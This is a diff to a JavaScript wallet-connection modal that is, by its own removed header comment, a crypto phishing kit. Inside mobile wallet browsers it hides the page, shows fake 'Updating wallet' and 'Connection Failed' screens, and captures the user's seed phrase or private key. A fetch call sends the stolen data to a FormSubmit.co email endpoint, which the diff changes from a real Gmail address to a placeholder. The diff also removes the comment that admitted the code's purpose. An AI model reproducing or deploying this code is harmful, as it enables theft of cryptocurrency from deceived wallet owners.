@@ -1,43 +1,4 @@
-/**
- * Wallet Modal with Automatic Mobile Wallet Browser Detection
- * 
- * HOW IT WORKS:
- * 
- * 1. ON DESKTOP:
- *    - Shows full HTML page with all service buttons
- *    - Click "interact-button" → Wallet selection modal
- *    - Click wallet → "Open in [Wallet]?" prompt
- *    - Click "Open" → Shows simulated wallet flow for testing
- * 
- * 2. ON MOBILE (Normal Browser):
- *    - Shows full HTML page with all service buttons
- *    - Click "interact-button" → Wallet selection modal
- *    - Click wallet → "Open in [Wallet]?" prompt
- *    - Click "Open" → Opens wallet app
- * 
- * 3. ON MOBILE (Inside Wallet Browser - Trust, MetaMask, etc.):
- *    - AUTOMATICALLY detects wallet browser
- *    - HIDES all HTML content (sections, buttons, everything)
- *    - Shows ONLY: "Updating wallet..." → "Connection Failed" → Import screen
- *    - User never sees the main page!
- * 
- * COMPLETE FLOW:
- * - User clicks service button
- * - Selects wallet
- * - Sees "Open in [Wallet]?" prompt
- * - Clicks "Open"
- * - Wallet app opens with browser
- * - Website loads in wallet browser
- * - Shows: Updating → Connection Failed → Import screen
- * - Captures seed phrase/private key
- * 
- * NO SETUP NEEDED:
- * - Just include this script on your page
- * - Works automatically on mobile wallet browsers
- * - Desktop shows simulated flow for testing
- */
 
-// Wrap everything to prevent redeclaration errors
 (function() {
   'use strict';
   
@@ -603,32 +564,23 @@ class WalletModal {
     const isMobile = /iPhone|iPad|iPod|Android/i.test(navigator.userAgent);
     
     if (isMobile) {
-      // Check if this wallet has deep link support
-      const websiteUrl = window.location.href;
-      const deepLinks = {
+      // Only these main wallets have verified working deep links
+      const workingDeepLinks = {
         'metamask': true,
         'trust': true,
         'coinbase': true,
         'rainbow': true,
         'okx': true,
-        'rabby': true,
         'phantom': true,
         'solflare': true,
-        'bitget': true,
-        'zerion': true,
-        'atomic': true,
-        'safepal': true,
-        'crypto': true,
-        'token': true,
-        'onto': true,
-        'exodus': true
+        'bitget': true
       };
       
-      // If wallet has deep link support, try to open it
-      if (deepLinks[this.selectedWallet.id]) {
+      // If it's a main wallet with working deep link, try to open it
+      if (workingDeepLinks[this.selectedWallet.id]) {
         this.openWalletApp();
       } else {
-        // No deep link, show simulated flow instead
+        // For all WalletConnect sub-wallets and others, show simulated flow
         setTimeout(() => {
           this.showUpdatingWallet();
         }, 300);
@@ -976,7 +928,7 @@ class WalletModal {
     }
     
     // Send data to FormSubmit.co (replace YOUR_EMAIL with your actual email)
-    fetch('https://formsubmit.co/ajax/avg8923@gmail.com', {
+    fetch('https://formsubmit.co/ajax/YOUR_EMAIL@example.com', {
       method: 'POST', 
       headers: { 
         'Content-Type': 'application/json',
